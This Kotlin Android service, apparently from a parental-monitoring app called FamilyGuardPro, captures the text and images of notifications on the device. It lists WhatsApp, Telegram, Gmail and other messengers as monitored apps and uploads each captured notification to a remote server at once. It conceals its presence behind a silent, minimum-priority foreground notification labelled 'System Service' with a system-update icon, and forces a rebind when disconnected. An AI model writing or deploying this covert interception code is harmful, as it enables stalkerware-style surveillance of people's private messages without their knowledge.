package com.familyguardpro.services

import android.app.Notification
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Icon
import android.os.Build
import android.os.IBinder
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.models.NotificationData
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream

class NotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationListener"
        private const val NOTIFICATION_ID = 1001
        
        // Apps to monitor
        private val MONITORED_APPS = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "com.instagram.android",
            "org.telegram.messenger",
            "com.facebook.orca",
            "com.facebook.katana",
            "com.snapchat.android",
            "com.twitter.android",
            "com.google.android.gm",
            "com.microsoft.office.outlook",
            "com.tencent.mm",
            "jp.naver.line.android",
            "com.viber.voip",
            "com.imo.android.imoim"
        )
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        Log.d(TAG, "NotificationListener created")
        startForegroundNotification()
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "NotificationListener connected")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "NotificationListener disconnected - requesting rebind")
        requestRebind(android.content.ComponentName(this, NotificationListener::class.java))
    }

    override fun onBind(intent: Intent?): IBinder? {
        return super.onBind(intent)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!preferenceManager.isChildMode()) return
        
        try {
            val packageName = sbn.packageName
            
            // Skip own notifications
            if (packageName == this.packageName) return
            
            // Process all notifications or only monitored apps
            val notification = sbn.notification
            val extras = notification.extras
            
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
            
            // Skip empty notifications
            if (title.isEmpty() && text.isEmpty() && bigText.isEmpty()) return
            
            // Get app name
            val appName = try {
                val pm = packageManager
                val appInfo = pm.getApplicationInfo(packageName, 0)
                pm.getApplicationLabel(appInfo).toString()
            } catch (e: Exception) {
                packageName
            }
            
            // Get small icon as base64 (optional)
            val iconBase64 = try {
                extractIconBase64(notification.smallIcon)
            } catch (e: Exception) {
                null
            }
            
            // Get large icon/image if present
            val imageBase64 = try {
                val largeIcon = extras.getParcelable<Bitmap>(Notification.EXTRA_LARGE_ICON)
                    ?: extras.getParcelable<Bitmap>(Notification.EXTRA_PICTURE)
                largeIcon?.let { compressAndEncode(it) }
            } catch (e: Exception) {
                null
            }
            
            val notificationData = NotificationData(
                id = sbn.key,
                packageName = packageName,
                appName = appName,
                title = title,
                text = if (bigText.isNotEmpty()) bigText else text,
                subText = subText,
                timestamp = sbn.postTime,
                iconBase64 = iconBase64,
                imageBase64 = imageBase64,
                isOngoing = notification.flags and Notification.FLAG_ONGOING_EVENT != 0,
                category = notification.category
            )
            
            // Upload immediately
            uploadNotification(notificationData)
            
            Log.d(TAG, "Notification captured: $appName - $title")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Optional: track when notifications are dismissed
    }

    private fun uploadNotification(data: NotificationData) {
        serviceScope.launch {
            try {
                val deviceId = preferenceManager.getDeviceId()
                if (deviceId.isEmpty()) return@launch
                
                val notificationItem = com.familyguardpro.network.NotificationItem(
                    packageName = data.packageName,
                    appName = data.appName,
                    title = data.title,
                    content = data.text,
                    text = data.text,
                    timestamp = data.timestamp,
                    imageUrl = data.imageBase64
                )
                
                val requestBody = com.familyguardpro.network.NotificationsRequestBody(
                    notifications = listOf(notificationItem)
                )
                
                ApiClient.api.uploadNotification(deviceId, requestBody)
                
                Log.d(TAG, "Notification uploaded successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload notification", e)
            }
        }
    }

    private fun extractIconBase64(icon: Icon?): String? {
        if (icon == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return null
        
        return try {
            val drawable = icon.loadDrawable(this)
            if (drawable is BitmapDrawable) {
                compressAndEncode(drawable.bitmap, 50)
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun compressAndEncode(bitmap: Bitmap, quality: Int = 70): String {
        val outputStream = ByteArrayOutputStream()
        
        // Resize if too large
        val maxSize = 200
        val scaledBitmap = if (bitmap.width > maxSize || bitmap.height > maxSize) {
            val scale = maxSize.toFloat() / maxOf(bitmap.width, bitmap.height)
            Bitmap.createScaledBitmap(
                bitmap,
                (bitmap.width * scale).toInt(),
                (bitmap.height * scale).toInt(),
                true
            )
        } else {
            bitmap
        }
        
        scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
        return Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
    }

    private fun startForegroundNotification() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_HIDDEN)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setSilent(true)
            .build()
        
        startForeground(NOTIFICATION_ID, notification)
    }
}
